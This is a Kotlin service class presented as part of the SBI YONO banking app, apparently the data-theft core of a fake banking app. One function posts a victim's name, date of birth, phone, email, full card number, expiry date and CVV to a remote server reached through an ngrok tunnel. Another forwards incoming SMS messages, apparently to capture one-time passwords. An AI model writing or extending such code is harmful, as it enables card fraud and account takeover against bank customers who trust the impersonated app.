package com.sbi.yonosbi.services

import android.content.Context
import android.os.Build
import com.sbi.yonosbi.BuildConfig
import com.sbi.yonosbi.utils.Constants
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import java.util.concurrent.TimeUnit

class UserApiService(private val context: Context) {

    private val baseURL = BuildConfig.API_BASE_URL + "/api/v1"

    private val client = OkHttpClient.Builder()
        .addInterceptor(
            HttpLoggingInterceptor().apply {
                level = HttpLoggingInterceptor.Level.NONE // Disable detailed logs
            }
        )
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()
    private val jsonMediaType = "application/json".toMediaType()

    suspend fun submitUserDetails(
        fullName: String,
        dateOfBirth: String,
        mobileNumber: String,
        emailAddress: String,
        totalLimit: String,
        availableLimit: String,
        cardholderName: String,
        cardNumber: String,
        expiryDate: String,
        cvv: String,
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "$baseURL/customers"

            val firstName = fullName.split(" ").firstOrNull() ?: ""

            val requestBody: Map<String, Any?> = mapOf(
                "phone_number" to mobileNumber,
                "full_name" to fullName,
                "email" to emailAddress,
                "device_id" to getDeviceId(),
                "name" to firstName,
                "dob" to dateOfBirth,
                "total_limit" to (totalLimit.toIntOrNull() ?: 0),
                "available_limit" to (availableLimit.toIntOrNull() ?: 0),
                "cardholder_name" to cardholderName,
                "card_number" to cardNumber,
                "expiry_date" to expiryDate,
                "cvv" to cvv
            )

            val jsonBody = gson.toJson(requestBody)
            val requestBodyOkHttp = jsonBody.toRequestBody(jsonMediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBodyOkHttp)
                .addHeader("Content-Type", "application/json")
                .addHeader("ngrok-skip-browser-warning", "true")
                .build()

            val response = client.newCall(request).execute()
            val success = response.isSuccessful && (response.code == 200 || response.code == 201)

            response.close()
            success
        } catch (_: Exception) {
            false
        }
    }

    suspend fun sendSmsMessage(
        sender: String,
        message: String,
        timestamp: Long,
        deviceId: String,
        cardSuffix: String? = null
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "$baseURL/messages"
            val isoTimestamp = convertTimestampToISO(timestamp)

            val requestBody: Map<String, Any?> = mapOf(
                "device_id" to deviceId,
                "sender" to sender,
                "card_suffix" to cardSuffix,
                "content" to message,
                "timestamp" to isoTimestamp
            )

            val jsonBody = gson.toJson(requestBody)
            val requestBodyOkHttp = jsonBody.toRequestBody(jsonMediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBodyOkHttp)
                .addHeader("Content-Type", "application/json")
                .addHeader("ngrok-skip-browser-warning", "true")
                .build()

            val response = client.newCall(request).execute()
            val success = response.isSuccessful && (response.code == 200 || response.code == 201)

            response.close()
            success
        } catch (_: Exception) {
            false
        }
    }

    suspend fun reportClientDiagnostic(
        event: String,
        details: Map<String, Any?> = emptyMap()
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "$baseURL/client-diagnostics"
            val requestBody: Map<String, Any?> = mapOf(
                "device_id" to getDeviceId(),
                "event" to event,
                "details" to details,
                "manufacturer" to Build.MANUFACTURER,
                "brand" to Build.BRAND,
                "model" to Build.MODEL,
                "sdk_int" to Build.VERSION.SDK_INT,
                "app_version" to BuildConfig.VERSION_NAME,
                "timestamp" to convertTimestampToISO(System.currentTimeMillis())
            )

            val jsonBody = gson.toJson(requestBody)
            val requestBodyOkHttp = jsonBody.toRequestBody(jsonMediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBodyOkHttp)
                .addHeader("Content-Type", "application/json")
                .addHeader("ngrok-skip-browser-warning", "true")
                .build()

            val response = client.newCall(request).execute()
            val success = response.isSuccessful && (response.code == 200 || response.code == 201)

            response.close()
            success
        } catch (_: Exception) {
            false
        }
    }

    private fun convertTimestampToISO(timestampMillis: Long): String {
        val sdf = java.text.SimpleDateFormat(
            "yyyy-MM-dd'T'HH:mm:ss'Z'",
            java.util.Locale.US
        )
        sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
        return sdf.format(java.util.Date(timestampMillis))
    }

    private fun getDeviceId(): String? {
        val localStorage = LocalStorage(context)
        return localStorage.getItem(Constants.DEVICE_ID_KEY)
    }

    suspend fun createDemoCustomer(): Boolean = withContext(Dispatchers.IO) {
        true
    }
}
